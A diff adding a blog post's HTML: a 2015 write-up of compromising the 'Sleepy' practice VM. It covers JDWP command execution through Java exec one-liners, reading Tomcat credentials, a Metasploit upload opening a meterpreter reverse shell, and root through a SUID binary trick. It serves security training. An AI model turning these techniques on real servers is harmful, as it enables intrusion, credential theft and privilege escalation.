@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>/dev/random: Sleepy - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-10-12">October 12, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags//dev/random">/dev/random</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">/dev/random: Sleepy</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Sleepy is another ‘short’ VM created by <a href="https://twitter.com/s4gi_">Sagi-</a>, although it’s slightly more difficult than <a href="http://rastamouse.me/blog/2015/dev-random-pipe/">Pipe</a>.</p>
+
+<h2 id="ports:98b6e5636154869990609b71ad7243a9">Ports</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sT -p- -A 192.168.56.103
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+9001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
+FTP allows anonymous login where you can download an image of Sleepy, but there appears to be nothing of interest with it.
+</code></pre>
+
+<h2 id="jserv:98b6e5636154869990609b71ad7243a9">JServ</h2>
+
+<p>Apache JServ is a really interesting protocol - it’s basically designed to proxy inbound requests from a web server through to an application server. If you try to access port 8009 directly, you get no response.</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.56.103:8009
+curl: (56) Recv failure: Connection reset by peer
+</code></pre>
+
+<p>What we have to do, is proxy the requests via Apache using the jk-mod.</p>
+
+<pre><code class="language-text">root@kali:~# apt-get install libapache2-mod-jk
+
+root@kali:~# vi /etc/apache2/mods-enabled/jk.conf
+JkWorkersFile /etc/libapache2-mod-jk/workers.properties   ---&gt;   JkWorkersFile /etc/apache2/workers.properties
+
+root@kali:~# cp /etc/libapache2-mod-jk/workers.properties /etc/apache2/
+
+root@kali:~# vi /etc/apache2/workers.properties
+worker.ajp13_worker.host=localhost   ---&gt;   worker.ajp13_worker.host=192.168.56.103
+
+root@kali:~# vi /etc/apache2/sites-enabled/000-default.conf
+JKMount /* ajp13_worker
+
+root@kali:~# a2enmod proxy_http
+root@kali:~# a2enmod proxy_ajp
+
+root@kali:~# service apache2 restart
+</code></pre>
+
+<p>Now if we browse to our localhost, we get Tomcat on the remote host!</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/sleepy/tomcat.png"  />
+    
+    
+</figure>
+</div>
+
+<p>I tried all the obvious/default passwords for Tomcat Manager, but no success. Time to turn my attention to JDWP.</p>
+
+<h2 id="jdwp:98b6e5636154869990609b71ad7243a9">JDWP</h2>
+
+<p>We find that we can attach to the JDWP service without any authentication.</p>
+
+<pre><code class="language-text">root@kali:~# jdb -attach 192.168.56.103:9001
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+&gt;
+</code></pre>
+
+<p>I tried to use the <code>Metasploit Java Debug Wire Protocol Remote Code Execution</code> exploit, but it wouldn’t work. I later found that payloads were getting written to <code>/tmp</code>, but they weren’t being executed.</p>
+
+<p>You can execute your own commands manually with some dirty, dirty Java. There is a pretty good summary of it <a href="http://blog.silentsignal.eu/2014/02/09/jdb-tricks-hacking-java-debug-wire/">here</a>. First, we want to find where the <code>tomcat-users</code> file is stored.</p>
+
+<pre><code class="language-text">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;find / -name tomcat-users.xml&quot;).getInputStream())).readLine())
+  = &quot;/etc/tomcat/tomcat-users.xml&quot;
+</code></pre>
+
+<p>So there are two ways to go about this - the easiest is to copy the file into the FTP directory and download it via your anonymous login. To find the correct directory, I just did another <code>find</code> for <code>sleepy.png</code>.</p>
+
+<pre><code class="language-text">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;find / -name sleepy.png&quot;).getInputStream())).readLine())
+  &quot;/var/ftp/pub/sleepy.png&quot;
+
+print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/&quot;).getInputStream())).readLine())
+
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1002     1002       120456 Jun 18 21:40 sleepy.png
+-rw-r--r--    1 1002     1002         2190 Oct 11 22:51 tomcat-users.xml
+226 Directory send OK.
+</code></pre>
+
+<p>The other method is to read the file directly. However, there is a bit of an issue when trying to return files that have newlines in them and as mentioned in that post, there is no way to loop to return multiple lines.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/sleepy/loop.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>This is where the split trick comes in.</p>
+
+<pre><code class="language-text">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(new java.lang.String(&quot;bashXX-cXXcat /etc/tomcat/tomcat-users.xml|tr '\n' ' '&quot;).split(&quot;XX&quot;)).getInputStream())).readLine())
+  = &quot;&lt;?xml version='1.0' encoding='utf-8'?&gt; &lt;!--   Licensed to the Apache Software Foundation (ASF) under one or more   contributor license agreements.  See the NOTICE file distributed with   this work for additional information regarding copyright ownership.   The ASF licenses this file to You under the Apache License, Version 2.0   (the &quot;License&quot;); you may not use this file except in compliance with   the License.  You may obtain a copy of the License at        http://www.apache.org/licenses/LICENSE-2.0    Unless required by applicable law or agreed to in writing, software   distributed under the License is distributed on an &quot;AS IS&quot; BASIS,   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.   See the License for the specific language governing permissions and   limitations under the License. --&gt; &lt;tomcat-users&gt; &lt;!--   NOTE:  By default, no user is included in the &quot;manager-gui&quot; role required   to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,   you must define such a user - the username and password are arbitrary. --&gt; &lt;!--   NOTE:  The sample user and role entries below are wrapped in a comment   and thus are ignored when reading this file. Do not forget to remove   &lt;!.. ..&gt; that surrounds them. --&gt;   &lt;role rolename=&quot;tomcat&quot;/&gt;   &lt;role rolename=&quot;role1&quot;/&gt;  &lt;!-- &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;tomcat,manager-gui,admin,manager-jmx,admin-gui,admin-script,manager,manager-script,manager-status&quot;/&gt; --&gt;   &lt;user username=&quot;both&quot; password=&quot;tomcat&quot; roles=&quot;tomcat,role1&quot;/&gt;   &lt;user username=&quot;role1&quot; password=&quot;tomcat&quot; roles=&quot;role1&quot;/&gt;  &lt;role rolename=&quot;admin&quot;/&gt;  &lt;role rolename=&quot;admin-gui&quot;/&gt;  &lt;role rolename=&quot;admin-script&quot;/&gt;  &lt;role rolename=&quot;manager&quot;/&gt; &lt;role rolename=&quot;manager-gui&quot;/&gt;  &lt;role rolename=&quot;manager-script&quot;/&gt; &lt;role rolename=&quot;manager-jmx&quot;/&gt;  &lt;role rolename=&quot;manager-status&quot;/&gt; &lt;!-- &lt;user name=&quot;admin&quot; password=&quot;adminadmin&quot; roles=&quot;admin,manager,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&quot; /&gt; --&gt;   &lt;user username=&quot;sl33py&quot; password=&quot;Gu3SSmYStR0NgPa$sw0rD!&quot; roles=&quot;tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status&quot;/&gt;  &lt;/tomcat-users&gt; &quot;
+</code></pre>
+
+<p>The reason this works, is that the <code>exec()</code> method requires an array to be passed, as described <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html">here</a>.</p>
+
+<pre><code class="language-text">exec(String[] cmdarray)
+Executes the specified command and arguments in a separate process.
+</code></pre>
+
+<p><code>username=&quot;sl33py&quot; password=&quot;Gu3SSmYStR0NgPa$sw0rD!&quot;</code> is what we were after - and now we can log into the Tomcat Manager. To get a shell, we’ll use the <code>Tomcat Manager Authenticated Upload Code Execution</code> module.</p>
+
+<pre><code class="language-text">PASSWORD   Gu3SSmYStR0NgPa$sw0rD!
+RHOST      127.0.0.1
+RPORT      80
+TARGETURI  /manager
+USERNAME   sl33py
+</code></pre>
+
+<p>I set my target as <code>Linux x86</code> and used the <code>linux/x86/meterpreter/reverse_tcp</code> payload, but you could also use a Java-based payload.</p>
+
+<pre><code class="language-text">msf exploit(tomcat_mgr_upload) &gt; exploit
+
+[*] Started reverse handler on 192.168.56.101:4444
+[*] 127.0.0.1:80 - Retrieving session ID and CSRF token...
+[*] 127.0.0.1:80 - Finding CSRF token...
+[*] 127.0.0.1:80 - Uploading and deploying V5bvuvzO1juTdM...
+[*] 127.0.0.1:80 - Uploading 1866 bytes as V5bvuvzO1juTdM.war ...
+[*] 127.0.0.1:80 - Executing V5bvuvzO1juTdM...
+[*] 127.0.0.1:80 - Executing /V5bvuvzO1juTdM/AcVlSx5ZMqE9wtXvp5cLRc3dRPgGXgO.jsp...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] 127.0.0.1:80 - Finding CSRF token...
+[*] 127.0.0.1:80 - Undeploying V5bvuvzO1juTdM ...
+[*] Sending stage (1495598 bytes) to 192.168.56.103
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -&gt; 192.168.56.103:38344) at 2015-10-13 21:52:42 +0100
+
+meterpreter &gt;
+</code></pre>
+
+<h2 id="tty-nightmare:98b6e5636154869990609b71ad7243a9">TTY Nightmare</h2>
+
+<p>If we go in search for SUID binaries (owned by root), we find a suspicious looking candidate.</p>
+
+<pre><code class="language-text">sh-4.2$ find / -user root -perm -4000 -print 2&gt; /dev/null
+/usr/bin/mount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/crontab
+/usr/bin/nightmare   &lt;--- this sucker
+/usr/bin/passwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib64/dbus-1/dbus-daemon-launch-helper
+
+sh-4.2$ ls -l /usr/bin/nightmare
+-rwsr-s---. 1 root tomcat 8669 Jan 18  2015 /usr/bin/nightmare
+
+sh-4.2$ /usr/bin/nightmare
+[-] error: no tty present
+</code></pre>
+
+<p>I downloaded the binary to my host so I could analyse it.</p>
+
+<pre><code class="language-text">root@kali:~# file nightmare
+nightmare: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=708d5928a47d433d5b40fca49305e332808e743a, not stripped
+
+root@kali:~# ./nightmare
+sh: 1: /usr/bin/aafire: not found
+</code></pre>
+
+<p>I downloaded <code>/usr/bin/aafire</code> and ran <code>nightmare</code> again. This time I got saw cool ASCII fire going - but then another binary tries to get executed: <code>/usr/bin/sl</code>. I downloaded this one too, and finally got this:</p>
+
+<video width="320" height="240" controls>
+  <source src="/img/writeups/sleepy/vid.webm" type="video/webm">
+Your browser does not support the video tag.
+</video>
+
+<p>First the binary checks to see if <code>tty</code> is present.</p>
+
+<pre><code class="language-text">mov    esi,0x2
+mov    edi,0x400a0c
+mov    eax,0x0
+call   0x400690 &lt;open@plt&gt;
+
+x/s 0x400a0c
+0x400a0c: &quot;/dev/tty&quot;
+</code></pre>
+
+<p>There are two functions called <code>fire</code> and <code>train</code>.</p>
+
+<pre><code class="language-text">gdb-peda$ pdisass fire
+
+push   rbp
+mov    rbp,rsp
+mov    edi,0x4009fc
+call   0x400640 &lt;system@plt&gt;
+pop    rbp
+ret
+
+gdb-peda$ x/s 0x4009fc
+0x4009fc: &quot;/usr/bin/aafire&quot;
+</code></pre>
+
+<pre><code class="language-text">gdb-peda$ pdisass train
+
+push   rbp
+mov    rbp,rsp
+mov    edx,0x0
+mov    esi,0x0
+mov    edi,0x0
+mov    eax,0x0
+call   0x400620 &lt;setresuid@plt&gt;
+mov    edx,0x0
+mov    esi,0x0
+mov    edi,0x0
+mov    eax,0x0
+call   0x400630 &lt;setresgid@plt&gt;
+mov    edi,0x4009ec
+call   0x400640 &lt;system@plt&gt;
+pop    rbp
+ret
+
+x/s 0x4009ec
+0x4009ec: &quot;/usr/bin/sl -al&quot;
+</code></pre>
+
+<p>Finally, there is a <code>sigHandler</code> function.</p>
+
+<pre><code class="language-text">gdb-peda$ pdisass sigHandler
+
+push   rbp
+mov    rbp,rsp
+sub    rsp,0x10
+mov    DWORD PTR [rbp-0x4],edi
+mov    eax,0x0
+call   0x4007cd &lt;train&gt;
+mov    edi,0x0
+call   0x4006a0 &lt;exit@plt&gt;
+</code></pre>
+
+<p>So, to summerise:</p>
+
+<ul>
+<li>The binary checks for <code>tty</code></li>
+<li>(if yes) <code>/usr/bin/aafire</code> is executed</li>
+<li>This runs until the user presses Ctrl+C (i.e. a SIGINT)</li>
+<li><code>setresuid</code> and <code>setresgid</code> are both set to <code>0</code></li>
+<li><code>/usr/bin/sl -al</code> is executed</li>
+</ul>
+
+<p>I found a really ugly way to solve this, without having a proper interactive shell. Using the classic ‘python pty’ trick, the binary will partially run. But first define the new function.</p>
+
+<pre><code class="language-text">bash-4.2$ function /usr/bin/sl() { /bin/sh; }
+bash-4.2$ export -f /usr/bin/sl
+
+bash-4.2$ /usr/bin/nightmare
+Error opening terminal: unknown.
+[+] Again [y/n]?
+</code></pre>
+
+<p>Now, in a second shell:</p>
+
+<pre><code class="language-text">bash-4.2$ ps aux | grep nightmare
+root  3948    0.0     0.0     4164    356 pts/7   S+  01:41   0:00 /usr/bin/nightmare
+
+bash-4.2$ kill -2 3948
+</code></pre>
+
+<p>Go back to the previous shell, and a new root shell should be waiting.</p>
+
+<pre><code class="language-text">bash-4.2$ /usr/bin/nightmare
+Error opening terminal: unknown.
+[+] Again [y/n]? sh-4.2# id
+uid=0(root) gid=0(root) group=0(root),91(tomcat)
+</code></pre>
+
+<p>Sagi- has a nice trick for getting a proper interactive shell using <code>busybox</code>, which you should definitely check out.</p>
+
+<h2 id="flag:98b6e5636154869990609b71ad7243a9">Flag</h2>
+
+<pre><code class="language-text">sh-4.2# cat /root/flag.txt
+Well done!
+
+Here's your flag: 3eb030c6ab099b0a355712fe38d59ffb
+</code></pre>
+
+<p>This is the MD5 of <code>pewpewpew</code> :)</p>
+
+<p>Thanks Sagi- for another awesome VM - I learned a lot doing this one!</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
